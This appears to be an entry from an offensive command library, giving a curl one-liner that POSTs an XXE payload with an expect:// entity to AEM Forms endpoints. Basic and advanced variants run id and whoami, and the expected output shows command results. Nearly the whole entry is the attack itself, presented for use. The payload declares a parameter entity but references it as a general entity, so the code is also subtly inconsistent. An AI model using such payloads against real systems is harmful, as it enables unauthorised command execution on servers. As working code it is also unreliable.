---
data: >-
  curl -X POST https://target.example.com/forms/vulnerable-endpoint -H
  "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo
  [<!ENTITY % xxe SYSTEM "expect://id"> ]><foo>&xxe;</foo>'
tags:
  - xxe
  - rce
  - web
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: ce93aa47-3512-4bd6-81de-a7d403e07ecf
created_at: '2025-12-13T09:00:27.608Z'
updated_at: '2025-12-13T09:00:27.608Z'
verified: false
validated: true
submitted: true
---
# curl-send-xxe-rce-payload

## Command

```bash
curl -X POST https://target.example.com/forms/vulnerable-endpoint -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "expect://id"> ]><foo>&xxe;</foo>'
```

## Description

This command sends a malicious XML payload via POST to exploit XXE for potential RCE in vulnerable AEM Forms endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specify POST method | Yes |
| `-H` | Set Content-Type header | Yes |
| `-d` | Data payload (XML) | Yes |
| `url` | Target URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.example.com/forms/vulnerable-endpoint -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "expect://id"> ]><foo>&xxe;</foo>'
```

### Advanced Usage

```bash
curl -X POST -k https://target.example.com/forms/vulnerable-endpoint -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "expect://whoami"> ]><foo>&xxe;</foo>'
```

## Expected Output

Response body containing output from the executed command, such as 'uid=1000(user)' if successful.

## Related
- [[procedures/Exploit-XXE-for-RCE-in-AEM-Forms]]
- [[tools/Curl]]
